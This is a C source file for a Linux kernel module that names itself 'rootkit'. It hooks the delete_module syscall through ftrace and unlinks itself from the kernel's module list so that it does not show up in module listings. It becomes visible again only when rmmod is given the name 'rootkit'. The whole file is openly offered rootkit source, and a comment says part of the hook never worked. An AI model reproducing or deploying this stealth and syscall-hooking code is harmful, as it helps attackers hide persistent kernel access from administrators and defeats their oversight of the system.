
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/string.h>
#include <linux/netfilter_defs.h>
#include <linux/delay.h>
    


MODULE_LICENSE("GPL");
MODULE_VERSION("0.02");


static asmlinkage long (*orig_delete_module_func)(const char __user *, unsigned int flags);
static struct list_head *prev_module;

static void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage int delete_module_func(const char __user *name_user, unsigned int flags)
{
    int ret;
    char kernel_buf[MODULE_NAME_LEN];
    unsigned long copied_len;
    printk(KERN_INFO "start rmmod hook %d \n", MODULE_NAME_LEN);
    
    //never work :(
    if (strncpy_from_user(kernel_buf, name_user, MODULE_NAME_LEN-1) < 0) {
        printk(KERN_ERR "failed to copy name_user from user space\n");
        goto done;
    }
    kernel_buf[sizeof(kernel_buf) - 1] = '\0';
    printk(KERN_INFO "delete_module_func: name_user = %s\n", kernel_buf);

    if (strcmp(kernel_buf, "rootkit") == 0)
    {
        printk(KERN_INFO "delete rootkit\n", kernel_buf);
        showme();
    }

    
done:

    ret = orig_delete_module_func(name_user, flags);    
    return ret;
}



/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_delete_module", delete_module_func, &orig_delete_module_func),

};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;
    hideme();
    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
